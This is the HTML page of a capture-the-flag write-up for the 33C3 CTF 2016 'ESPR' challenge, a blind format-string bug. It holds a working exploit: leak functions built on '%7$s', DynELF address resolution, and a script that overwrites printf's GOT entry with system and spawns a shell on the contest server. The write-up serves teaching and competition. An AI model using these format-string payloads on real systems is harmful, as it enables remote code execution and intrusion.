@@ -1,0 +1,841 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Pwnable,Python,format_string,33C3," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hacking Tube 2.0" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Category: pwnPoints: 150">
+<meta name="keywords" content="CTF,Pwnable,Python,format_string,33C3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="33C3 CTF 2016 -- ESPR">
+<meta property="og:url" content="https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/index.html">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:description" content="Category: pwnPoints: 150">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-01-03T15:08:05.599Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="33C3 CTF 2016 -- ESPR">
+<meta name="twitter:description" content="Category: pwnPoints: 150">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/"/>
+
+
+
+
+
+  <title>33C3 CTF 2016 -- ESPR | Hacking Tube 2.0</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-100090256-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hacking Tube 2.0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Security and stuff.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bruce Chen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hacking Tube 2.0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">33C3 CTF 2016 -- ESPR</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-29T22:52:00+08:00">
+                2016-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index">
+                    <span itemprop="name">write-ups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2016/12/29/2016-12-29-33c3-ctf-2016-espr/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2016/12/29/2016-12-29-33c3-ctf-2016-espr/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>views
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Category:</strong> pwn<br><strong>Points:</strong> 150</p>
+<a id="more"></a>  
+<p>This time there’s no binary or libc.so provided, only an image looks like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">eat:                  sleep:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| sub rsp, 0x100  |   | mov edi, 0x1   |</span><br><span class="line">| mov rdi, rsp    |   | call _sleep    |</span><br><span class="line">| call _gets      |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">pwn:                  repeat:</span><br><span class="line">+-----------------+   +----------------+</span><br><span class="line">| mov rdi, rsp    |   |                |</span><br><span class="line">| call _printf    |   | jmp eat        |</span><br><span class="line">| add rsp, 0x100  |   |                |</span><br><span class="line">|                 |   |                |</span><br><span class="line">+-----------------+   +----------------+</span><br></pre></td></tr></table></figure></p>
+<p>Interesting…</p>
+<p>So apparently the program has two vulnerabilities: <strong>stack overflow</strong> &amp; <strong>format string</strong>. Since we can’t actually exploit the stack overflow vulnerability (the program likely won’t return because of the infinite loop), we’ll have to focus on the format string vulnerability and exploit the service without having the binary file.</p>
+<p>So how are we gonna do this? Fortunately, <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">pwntools</a> is here to rescue! <strong>By using the amazing <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">DynELF</a> module, we’re able to resolve &amp; leak some address without the need for binary!</strong> </p>
+<p>First we’ll need a <code>leak</code> function to let pwntools able to leak data at an arbitrary address. Here we exploit the format string vulnerability to leak an arbitrary address:<br><figure class="highlight python"><figcaption><span>leak</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%7$s.AAA"</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"leaking:"</span>, hex(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">".AAA"</span>)</span><br><span class="line">    ret = resp[:<span class="number">-4</span>:] + <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, repr(ret)</span><br><span class="line">    r.recvrepeat(<span class="number">0.2</span>) <span class="comment"># receive the rest of the string</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure></p>
+<p>Then we need a pointer into the binary. I got the pointer by entering <code>%30$p</code>, which returned <code>0x40060d</code>. Now we can use the <code>DynELF</code> module to help us resolve some function addresses.</p>
+<p>First we’ll need to resolve the address of <code>printf</code> and <code>system</code>:<br><figure class="highlight python"><figcaption><span>leak library addresses</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"printf_addr: "</span>+hex(printf_addr))</span><br><span class="line">log.success(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br></pre></td></tr></table></figure></p>
+<p>It took a while because of <code>sleep(1)</code>, and pwntools will need a lot of addresses to resolve those functions.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] printf_addr: 0x7fb040a17550</span><br><span class="line">[+] system_addr: 0x7fb040a066d0</span><br></pre></td></tr></table></figure></p>
+<p>OK so now we know the offset between <code>printf</code> and <code>system</code>. Next time we’ll just have to leak <code>printf@got.plt</code>, calculate <code>system</code>‘s address and use it to overwrite <code>printf</code>‘s GOT entry, finally we’ll be able to hijack <code>printf</code>‘s GOT and call <code>system(&quot;sh&quot;)</code> by entering “sh”.</p>
+<p>But first we’ll have to know the address of <code>printf@got.plt</code>. Luckily, not only can <code>DynELF</code> resolve function addresses, it can also resolve some useful addresses such as the pointer to the <code>.dynamic</code> section:<br><figure class="highlight python"><figcaption><span>resolve .dynamic section</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, <span class="number">0x40060d</span>)</span><br><span class="line">dynamic_ptr = d.dynamic</span><br></pre></td></tr></table></figure></p>
+<p>Once we got the <code>.dynamic</code> section’s address, we can use it to locate the <code>.got.plt</code> area:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Dynamic section at offset 0xe28 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]</span><br><span class="line"> 0x000000000000000c (INIT)               0x400400</span><br><span class="line"> 0x000000000000000d (FINI)               0x400614</span><br><span class="line"> 0x0000000000000019 (INIT_ARRAY)         0x600e10</span><br><span class="line"> 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000000000001a (FINI_ARRAY)         0x600e18</span><br><span class="line"> 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)</span><br><span class="line"> 0x000000006ffffef5 (GNU_HASH)           0x400298</span><br><span class="line"> 0x0000000000000005 (STRTAB)             0x400330</span><br><span class="line"> 0x0000000000000006 (SYMTAB)             0x4002b8</span><br><span class="line"> 0x000000000000000a (STRSZ)              68 (bytes)</span><br><span class="line"> 0x000000000000000b (SYMENT)             24 (bytes)</span><br><span class="line"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x601000  &lt;--- here</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><figcaption><span>resolve PLTGOT</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    addr = dynamic_ptr + <span class="number">0x10</span>*cnt</span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="keyword">if</span> ret == <span class="string">"\x03\x00"</span>: <span class="comment">#TYPE PLTGOT</span></span><br><span class="line">        addr += <span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">            ret = leak(addr+i)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"ret:"</span>, ret.encode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>Now we can find where <code>printf@got.plt</code> is, by leaking all the GOT entry and compare the low 12 bits of the function address (see if it ends with <code>550</code>):<br><figure class="highlight python"><figcaption><span>resolve printf@got.plt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">got = <span class="number">0x601000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</span><br><span class="line">    addr = got + i*<span class="number">8</span></span><br><span class="line">    ret = leak(addr)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, ret.encode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>Finally, we can start exploiting the service:<br><figure class="highlight python"><figcaption><span>exp_espr.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"78.46.224.86"</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.endian = <span class="string">'little'</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.log_level = <span class="string">'INFO'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%7$s.AAA"</span>+p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"leaking:"</span>, hex(addr)</span><br><span class="line">    resp = r.recvuntil(<span class="string">".AAA"</span>)</span><br><span class="line">    ret = resp[:<span class="number">-4</span>:] + <span class="string">"\x00"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"ret:"</span>, repr(ret)</span><br><span class="line">	r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    printf_got = <span class="number">0x601018</span></span><br><span class="line">    printf_addr = u64(leak(printf_got).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    system_addr = printf_addr - <span class="number">0x10e80</span> <span class="comment"># remote</span></span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"printf_addr: "</span>+hex(printf_addr))</span><br><span class="line">    log.success(<span class="string">"system_addr: "</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line">    byte1 = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">    byte2 = (system_addr &amp; <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">    log.success(<span class="string">"byte1: "</span>+hex(byte1))</span><br><span class="line">    log.success(<span class="string">"byte2: "</span>+hex(byte2))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%"</span> + str(byte1) + <span class="string">"c"</span> + <span class="string">"%10$hhn."</span></span><br><span class="line">    payload += <span class="string">"%"</span> + str(byte2-byte1<span class="number">-1</span>) + <span class="string">"c"</span> + <span class="string">"%11$hn."</span></span><br><span class="line">    payload = payload.ljust(<span class="number">32</span>, <span class="string">"A"</span>)</span><br><span class="line">    payload += p64(printf_got) + p64(printf_got+<span class="number">1</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.sendline(<span class="string">"sh\x00"</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>flag: <code>33C3_f1rst_tshirt_challenge?!</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/format-string/" rel="tag"># format_string</a>
+          
+            <a href="/tags/33C3/" rel="tag"># 33C3</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/12/29/2016-12-29-33c3-ctf-2016-the-0x90s-called/" rel="next" title="33C3 CTF 2016 -- The 0x90s called">
+                <i class="fa fa-chevron-left"></i> 33C3 CTF 2016 -- The 0x90s called
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/12/30/2016-12-30-33c3-ctf-2016-babyfengshui/" rel="prev" title="33C3 CTF 2016 -- babyfengshui">
+                33C3 CTF 2016 -- babyfengshui <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2016/12/29/2016-12-29-33c3-ctf-2016-espr/';
+          this.page.identifier = '2016/12/29/2016-12-29-33c3-ctf-2016-espr/';
+          this.page.title = '33C3 CTF 2016 -- ESPR';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
